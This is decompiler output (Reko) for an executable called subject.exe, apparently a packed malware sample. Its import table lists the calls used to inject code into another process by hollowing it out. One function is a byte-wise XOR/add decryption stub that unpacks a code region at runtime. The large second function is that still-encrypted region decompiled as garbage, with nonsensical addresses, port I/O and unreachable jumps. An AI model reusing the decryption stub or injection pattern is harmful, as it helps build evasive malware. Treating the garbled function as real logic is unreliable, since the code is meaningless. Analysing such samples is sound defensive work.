// subject_idata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

word32 g_dw40602C = 24744; // 0040602C
word32 g_dw406030 = 0x60B8; // 00406030
word32 g_dw406034 = 0x60CC; // 00406034
word32 g_dw406038 = 0x60DC; // 00406038
word32 g_dw40603C = 24824; // 0040603C
word32 g_dw406040 = 0x6110; // 00406040
word32 g_dw406044 = 24868; // 00406044
word32 g_dw406048 = 24888; // 00406048
word32 g_dw40604C = 0x614C; // 0040604C
word32 g_dw406050 = 24924; // 00406050
word32 g_dw406054 = 24944; // 00406054
word32 g_dw406058 = 24964; // 00406058
word32 g_dw40605C = 24988; // 0040605C
word32 g_dw406060 = 25000; // 00406060
<anonymous> * __imp__CloseHandle = &g_t60A8; // 0040606C
<anonymous> * __imp__CreateProcessA = &g_t60B8; // 00406070
<anonymous> * __imp__ExitProcess = &g_t60CC; // 00406074
<anonymous> * __imp__GetEnvironmentVariableA = &g_t60DC; // 00406078
<anonymous> * __imp__GetModuleFileNameA = &g_t60F8; // 0040607C
<anonymous> * __imp__GetShortPathNameA = &g_t6110; // 00406080
<anonymous> * __imp__GetThreadContext = &g_t6124; // 00406084
<anonymous> * __imp__ReadProcessMemory = &g_t6138; // 00406088
<anonymous> * __imp__ResumeThread = &g_t614C; // 0040608C
<anonymous> * __imp__SetThreadContext = &g_t615C; // 00406090
<anonymous> * __imp__VirtualAllocEx = &g_t6170; // 00406094
<anonymous> * __imp__WriteProcessMemory = &g_t6184; // 00406098
<anonymous> * __imp__lstrcatA = &g_t619C; // 0040609C
<anonymous> * __imp__lstrcpyA = &g_t61A8; // 004060A0
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	word32 ebp;
	word32 ecx;
	struct Eq_5 * edx;
	Eq_6 esi;
	word32 edi;
	struct Eq_8 * ebx;
	struct Eq_9 * ds;
	struct Eq_10 * es;
	Eq_11 tLoc04;
	word32 dwLoc20;
	tLoc04.dw0000 = ebp;
	fn00401078(g_a401131, (byte (*)[]) 0x063C);
	fn00401131(ecx, edx, ebx, &tLoc04, esi, edi, es, ds, dwLoc20);
	fn00401078(g_a401131, (byte (*)[]) 0x063C);
	return 0x00;
}

// 00401078: void fn00401078(Stack (ptr32 (arr byte)) dwArg04, Stack (ptr32 (arr byte)) dwArg08)
// Called from:
//      Win32CrtStartup
void fn00401078(byte (* dwArg04)[], byte (* dwArg08)[])
{
	byte (* dwLoc08_113)[];
	for (dwLoc08_113 = null; dwLoc08_113 < dwArg08; ++dwLoc08_113)
	{
		if (dwLoc08_113 > null && (dwLoc08_113 & 0x01) == 0x00)
			Mem40[dwArg04 + dwLoc08_113:byte] = Mem12[dwLoc08_113 + dwArg04:byte] ^ 0x3D;
		if (dwLoc08_113 > (byte (*)[]) 0x01)
			Mem56[dwArg04 + dwLoc08_113:byte] = Mem42[dwLoc08_113 + dwArg04:byte] + 0x08;
		if (dwLoc08_113 > (byte (*)[]) 0x02 && (dwLoc08_113 - (byte (*)[]) 0x02 & 0x01) == 0x00)
			Mem79[dwArg04 + dwLoc08_113:byte] = Mem58[dwLoc08_113 + dwArg04:byte] - 0x57;
		if ((int32) (SEQ(dwLoc08_113 >> 0x1F, dwLoc08_113) % 0x03) == 0x00)
			Mem105[dwArg04 + dwLoc08_113:byte] = Mem81[dwLoc08_113 + dwArg04:byte] - SLICE(dwLoc08_113, byte, 0);
	}
}

// 00401131: void fn00401131(Register word32 ecx, Register (ptr32 Eq_5) edx, Register (ptr32 Eq_8) ebx, Register (ptr32 Eq_29) ebp, Register Eq_6 esi, Register word32 edi, Register (ptr16 Eq_10) es, Register (ptr16 Eq_9) ds, Stack word32 dwArg00)
// Called from:
//      Win32CrtStartup
void fn00401131(word32 ecx, struct Eq_5 * edx, struct Eq_8 * ebx, struct Eq_29 * ebp, Eq_6 esi, word32 edi, struct Eq_10 * es, struct Eq_9 * ds, word32 dwArg00)
{
	ptr32 fp;
	Eq_96 SO;
	bool P_45;
	byte cl = (byte) ecx;
	byte dh = SLICE(edx, byte, 8);
	byte bh_261 = SLICE(ebx, byte, 8);
	cu8 al_19 = (byte) fp - 0x04;
	word16 eax_16_16_253 = SLICE(fp - 4, word16, 16);
	if (!SO)
	{
		esi.u0->bFFFFFFF8 &= 114;
		P_45 = SLICE(cond(cl & dh), bool, 5);
		P_45 = !PARITY_EVEN(cl & dh);
	}
	Eq_112 P_46 = SLICE(P_45, bool, 5);
	byte dl_39 = (byte) edx;
	Eq_116 dx_58 = (word16) edx;
	if (al_19 <= ~0x60)
	{
		__lock();
		cu8 v21_40 = edx->bF75BF60A - dl_39;
		edx->bF75BF60A = v21_40;
		struct Eq_148 * esp_114 = dwArg00 + 4;
		bool v124_314 = v21_40 != 0x00;
		bool v127_317 = v21_40 >= 0x00;
		struct Eq_157 * ecx_279 = ecx - 0x01;
		word24 eax_24_8_282 = SEQ(eax_16_16_253, cond(v21_40) | P_46);
		if (v21_40 == 0x00 && ecx != 0x01)
		{
			struct Eq_148 * eax_382 = SEQ(eax_24_8_282, __in<byte>(dx_58));
l004011A7:
			byte al_61 = (byte) eax_382;
			*(byte *) 0x72FE47E0 = al_61;
			do
			{
				word16 bx_250 = (word16) ebx;
				if (v127_317)
				{
					P_45 = !PARITY_EVEN(edi + 1 & esi);
					if (Test(UGE,false))
						esp_114->wFFFFFFFE = ds;
					--ecx_279;
					if ((edi + 1 & esi) == 0x00 && ecx_279 != null)
					{
						do
							;
						while ((ebx->dw0000 & 443605320) >= 0x00);
						*(byte *) 1996377561 = al_61;
						__out<word32>(dx_58, eax_382);
						do
							;
						while (Test(OV,false));
						if (Test(ULT,false))
						{
							ebp->b0005 &= ~0x41;
							struct Eq_5 * edx_132 = edx;
							do
							{
								*(word32 *) ~0x1F14419E = (word32) esi + *((word32 *) ~0x1F14419E);
								Eq_116 dx_111 = (word16) edx_132;
								int32 eax_112 = __in<word32>(dx_111);
								struct Eq_303 * edi_115 = esp_114->dw0000;
								__out<byte>(dx_111, (byte) eax_112);
								edi_115->a8FF755F6[eax_112] -= (byte) dx_111;
								uint64 edx_eax_130 = SEQ(edx_132, SLICE(eax_112, word24, 8), __in<byte>(0x50));
								uint32 eax_133 = (uint32) (edx_eax_130 /u *((uint32 *) ~0x1F144212));
								edx_132 = (uint32) (edx_eax_130 % *((uint32 *) ~0x1F144212));
								ebp->b005F -= ~0x41;
								uint16 ax_138 = (word16) eax_133;
								uint8 ah_140 = (uint8) (ax_138 % *((bu8 *) ~0x1F144175));
								uint8 al_141 = (uint8) (ax_138 /u *((bu8 *) ~0x1F144175));
								int32 edi_143 = edx_132->dw007D *s 0x03;
								esi = ~0x088F0C15 - *((word32 *) ~0x1F14419E);
								esi.u0->bF77023E9 = 177;
								cu8 v51_147 = es->*((word32) esi - 0x08500983) - ~0x41;
								es->*((word32) esi - 0x08500983) = v51_147;
								*(word32 *) ~0x08551516 = SEQ(SLICE(eax_133, word16, 16), ah_140, al_141);
								++esp_114;
								uint16 ax_156 = SEQ(ah_140, al_141);
							} while (v51_147 >= 0x00);
							ebp->bFFFFFFAF -= ~0x41;
							uint8 al_159 = (uint8) (ax_156 /u *((bu8 *) ~0x1F14414B));
							do
								esi.u0->dw5070EC17 = edi_143;
							while (al_159 >= 0x00);
						}
						(esp_114 * 0x02)->dwFFFFFFFC = ~0x1B;
						fn7437A576();
						return;
					}
					else
					{
						uint16 ax_225 = (word16) esp_114;
						uint8 al_230 = (uint8) (ax_225 /u ebx->b006C);
						esp_114 = eax_382;
						v127_317 = al_230 >= 0x00;
						v124_314 = al_230 != 0x00;
						eax_382 = SEQ(SLICE(esp_114, word16, 16), (uint8) (ax_225 % ebx->b006C), al_230);
						goto l004011A7;
					}
				}
				esp_114 = (struct Eq_148 *) 4192829932;
			} while (v124_314);
			__out<word32>(dx_58, eax_382);
			if (P_45)
				fn74374CD1();
			else
			{
				*(word32 *) 4192829928 = ebp->dwFFFFFFF7;
				__in<word32>(~0x07);
				__arpl(ecx_279->w0000, bx_250, &ecx_279->w0000);
			}
		}
		else
			ebp->b0060 -= bh_261;
	}
}

